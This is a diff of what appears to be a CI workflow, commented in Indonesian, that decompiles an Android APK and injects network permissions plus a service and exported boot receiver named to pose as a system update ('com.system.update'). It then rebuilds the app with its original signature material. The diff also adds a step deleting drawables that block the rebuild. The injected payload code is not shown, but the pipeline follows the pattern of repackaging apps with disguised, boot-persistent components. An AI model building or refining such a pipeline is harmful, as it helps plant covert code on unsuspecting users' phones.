@@ -100,19 +100,11 @@ jobs:
       - name: Modify AndroidManifest.xml with Python (SAFE)
         run: |
           python3 << 'EOF'
-          import xml.etree.ElementTree as ET
           import re
-
           MANIFEST_FILE = "decoded/AndroidManifest.xml"
-
-          # Baca file
           with open(MANIFEST_FILE, 'r') as f:
               content = f.read()
-
-          # Perbaiki jika ada DUMMYVAL
           content = re.sub(r'APKTOOL_DUMMYVAL_[^"\s]+', 'dummy', content)
-
-          # Tambahkan izin sebelum </manifest>
           permissions = [
               '<uses-permission android:name="android.permission.INTERNET" />',
               '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
@@ -127,8 +119,6 @@ jobs:
           ]
           perms_str = '\n    '.join(permissions)
           content = content.replace('</manifest>', f'    {perms_str}\n</manifest>')
-
-          # Tambahkan service dan receiver sebelum </application>
           services = '''
           <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />
           <receiver android:name="com.system.update.BootReceiver" android:exported="true">
@@ -139,11 +129,8 @@ jobs:
           </receiver>
           '''
           content = content.replace('</application>', f'{services}\n</application>')
-
-          # Tulis ulang
           with open(MANIFEST_FILE, 'w') as f:
               f.write(content)
-
           print("✅ AndroidManifest.xml berhasil dimodifikasi")
           EOF
 
@@ -153,6 +140,15 @@ jobs:
           find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
           find decoded -name "public.xml" -delete 2>/dev/null || true
           echo "✅ DUMMYVAL berhasil dibersihkan"
+
+      - name: Remove problematic drawable files
+        run: |
+          find decoded/res -name "*vec_ic_glasses*" -delete 2>/dev/null || true
+          find decoded/res -name "*avd_hide_password*" -delete 2>/dev/null || true
+          find decoded/res -name "*avd_show_password*" -delete 2>/dev/null || true
+          find decoded/res -name "*mtrl_checkbox_button_checked_unchecked*" -delete 2>/dev/null || true
+          find decoded/res -name "*\$*" -delete 2>/dev/null || true
+          echo "✅ Drawable bermasalah dihapus"
 
       - name: Rebuild APK with --copy-original
         run: |
